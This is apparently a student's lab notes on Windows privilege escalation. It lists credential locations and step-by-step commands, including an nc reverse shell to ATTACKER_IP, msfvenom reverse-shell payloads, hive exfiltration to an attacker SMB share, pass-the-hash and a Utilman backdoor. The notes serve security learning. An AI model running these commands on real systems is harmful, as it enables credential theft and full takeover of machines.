---
creation date: January 10th 2023
last modified date: January 10th 2023
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: [[Privilege Escalation]] - [[Windows]]
Search Tag: #📕  

# [[Windows Privilege Escalation]]  
___

## Description:


## Unattended  Windows Installation
### Description
Large organizations might use this in order to do a Windows install. These installs require use of an Administrator account and if we can access the creds for this account we can use it for its higher privileges.

### Common Locations
- `C:\Unattend.xml`
- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Unattend\Unattend.xml`
- `C:\Windows\system32\sysprep.inf`
- `C:\Windows\system32\sysprep\sysprep.xml`

### Example
```shell-session
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```


## Powershell History
### Description
We can retrieve an accounts past commands in Powershell these are located and accessed with the following command

### Command
**cmd.exe**
```shell-session
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**powershell.exe**
```shell-session
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```


## Saved Windows Credentials
### Description
Windows allows us to use other users credentials. This also gives the option to save these credentials on the system.

### Command
This will list save accounts with credentials but we still wont be able to actually see the password but we can make use of the second command here if we see an interesting account.
```shell-session
cmdkey /list
```

```shell-session
runas /savecred /user:admin cmd.exe
```


## IIS Configuration
### Description
Internet Information Services(IIS) is the default web server on Windows installations. This file might contain stored passwords for databases or configured authentication mechanisms.

### Common Locations
- `C:\inetpub\wwwroot\web.config`
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`
- Quick way to search these files for  what we want:
```shell-session
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```


## Retrieve Credentials from Software: PuTTY
### Decryption
SSH client commonly used on Windows that will allow a user to save connections meaning the IP, user, and other configurations. PuTTY wont allow a user to store their SSH password it will store cleartext credentials in the proxy configurations.

### Command
```shell-session
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```


## Scheduled Tasks
### Description

### Commands
- `schtasks`
- We can refine the search with something like the following command:
```shell-session
schtasks /query /tn vulntask /fo list /v
```
- **Task To Run** is what we are looking for but we can get other useful information
	- This Task To Run indicates to us that the files listed will run meaning if we have permission to edit the file then we can use it to gain higher privilege possibly.
- We can next check if we have permission to edit a file with the following:
```shell-session
icacls C:\<PATH_TO_FILE>
```
- Possible reverse shells:
```shell-session
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```


## AlwaysInstallElevated
### Description
Windows installer files also known as (.msi) are used to install applications on the system. Usually they run with the same permission level of whoever runs them but they can be configured to run with higher privileges. This is only possible if two registry values are set.

### Commands
1. Run the two following commands if both are set then we are good to go.
```shell-session
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```
```shell-session
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
2. Next if both are set then we can generate a malicious .msi file using msfvenom:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.119.214 LPORT=LOCAL_PORT -f msi -o malicious.msi
```
3. Now we need to get this file onto the victim's machine then run it.


## Windows Services
### Description
These services are managed by the Service Control Manager (SCM). The SCM is in charge of managing the state of service as needed.

### Commands
- We can check individual services using `sc qc`
	- i.e. `sc qc apphostsvc`
```shell-session
C:\> sc qc apphostsvc 
[SC] QueryServiceConfig SUCCESS 

SERVICE_NAME: apphostsvc 
	TYPE : 20 WIN32_SHARE_PROCESS 
	START_TYPE : 2 AUTO_START 
	ERROR_CONTROL : 1 NORMAL 
	BINARY_PATH_NAME : C:\Windows\system32\svchost.exe -k apphost 
	LOAD_ORDER_GROUP : 
	TAG : 0 
	DISPLAY_NAME : Application Host Helper Service 
	DEPENDENCIES : 
	SERVICE_START_NAME : localSystem
```
- All of the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`


## Insecure Permissions on Service Executable
### Description
When a service has weak permissions that allow an attacker to modify or replace it.

### Commands
1. `sc qc <FILE_NAME>` to find a possible file
2. `icacls <PATH_TO_FILE>` to check its permissions
3. We are looking for **M** to be apart of a group we have access to like Everyone
4. Seeing this means we can edit the file and run it and have it run under which ever user set it up.
5. We need to now create a file that will call back to us and get it on the machine in this case we will run a Python server on our machine.
```bash
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe 

user@attackerpc$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
6. Now pull it with `wget`
	1. `wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe`
	2. `wget` only works on Powershell
7. Now move the file to the location we want it to replace
```shell-session
C:\> cd C:\PROGRA~2\SYSTEM~1\ 

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp 
1 file(s) moved. 

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe 
1 file(s) moved. 

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F 
Successfully processed 1 files.
```
9. Then we need a `nc` listener on our end so lets start that up
10. Lastly we need to restart the service so it will run our RSHELL
	1. `sc stop windowsscheduler`
	2. `sc start windowsscheduler`
	3. Use `sc.exe` when running on Powershell


## Unquoted Service Paths
### Description
When we can't directly write into service executables, there still might be a chance to force a service into running arbitrary executables.

This is when a Binary Path isn't in quotes. When the command is run it will see the spaces in the path and take them as arguments. This means when it runs it will first look for everything before the space if nothing is found then it moves onto adding the first argument then keeps repeating until it finds something it can execute.

We step in by making a file that matches anything before the full path so we can highjack it.

### Commands
1. `sc qc <FILE_NAME>`
2. Once we find one then can proceed
3. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe`
4. Start a listener on our machine
5. Now get it onto the victim using a python server on our machine and wget on Powershell on the victim
6. Next get it moved to our location and name it the correct based on what we found
7. `icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F`
8. Now stop/start the service with `sc stop <SERVICE_NAME>`
9. pwnd


## Insecure Service Permissions
### Description
This involves checking the service DACL not the executables DACL. We want to see if the general service DACL allows us to edit the permissions. If we are able to find this then we can setup the Path to execute any executable with whatever user we like including SYSTEM.

### Download
[Accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) = This can be used to check the service DACL from cli but it needs to be installed or transferred to the target

### Commands
1. Navigate to program you are using to search the service DACL in this case we are using **Accesschk**
2. `accesschk64.exe -qlc thmservice`
	- We are calling the .exe and feeding it the service name of "thmservice"
3. We are looking for the following highlighted text or something along these lines that indicates either all or a user we have access to can edit:
![[Pasted image 20230111195849.png]]
4. Next up we need a payload which we can get from msfvenom
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
```
5. Start a listener on the same port you created the payload
6. Start a python server so we can transfer the attack
7. On the victims machine using Powershell we can use `wget`
8. Once its on the victims machine we need to set its file permission to include everyone
```shell-session
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```
9. Finally we need to set the vuln service to execute this new executable:
```shell-session
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```
10. Now reboot the service:
```shell-session
sc stop THMService
```
```shell-session
sc start THMService
```
11. pwnd


## Windows Privileges
### Description
Each user has a set of assigned privileges they can be checked with the following command: `whoami /priv`

We can also take look at this site in order to get a list of interesting privileges [Priv2Admin](https://github.com/gtworek/Priv2Admin)


## SeBackup / SeRestore
### Description
This is a Windows Privilege that allows a user to read/write any file regardless of what the DACL has in place.

### Commands
1. `whoami /priv` = To check if we have this set on our current user
2. Next up is to backup both the SAM and SYSTEM hashes
```shell-session
reg save hklm\system C:\Users\THMBackup\system.hive
```
```shell-session
reg save hklm\sam C:\Users\THMBackup\sam.hive
```
3. Get both of these files over to our attacking machine now this time we are using Impacket's `smbserver.py`
```bash
mkdir share
```
```bash
python /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```
- We are creating a share called **public** and pointing it to **share** directory. We also feed it the creds of the current user we have access to.
4. Back on the victims machine we can now copy both of these hash files to our newly created share
```shell-session
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
```
```shell-session
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```
5. Attacker machine now we use Impacket's to retrieve user hashes and preform a Pass-the-Hash attack.
```bash
python /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```
```bash
	python /opt/impacket/examples/psexec.py -hashes <HASH_LOCATED_IN_LAST_STEP> administrator@10.10.154.159
```
6. This should get us a shell now with SYSTEM privileges
7. pwnd


## SeTakeOwnership
### Description
This is a Windows Privilege that allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for your attack.

For example search for a service running as SYSTEM and take ownership of the service's .exe.

### Commands
1. `whoami /priv` = To check if we have this tag
2. This time we will use `utilman.exe`  this is a built in Windows application used to provide Ease Access options during the lock screen.
3. To  start we need to start by taking ownership of this .exe
```shell-session
takeown /f C:\Windows\System32\Utilman.exe
```
4. Now that we own it we need to assign ourselves with the privileges.
```shell-session
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```
5. Now replace the .exe we now own with a copy of `cmd.exe`
```shell-session
copy cmd.exe utilman.exe
```
6. For this example we are working with we can trigger the file we replaced by using Lock in our menu on the victim's machine. Then we can click on the "Ease of Access" button which is run by the "Utilman.exe" we replaced this will instead pop up a cmd terminal.


## SeImpersonate / SeAssignPrimaryToken
### Description
These Windows Privileges allow us to impersonate other users and act on their behalf. 


## Unpatched Software
### Description
We might find that a machine has outdated software.

### Commands
1. This command will allow us to dump most of the installed software but might not be all depending how they installed things. We should also keep an eye out for shortcuts we find.
```shell-session
wmic product get name,version,vendor
```
2. Next up use any exploit site or  just google to find if we have anything good




___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: January 10th 2023 (09:07 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
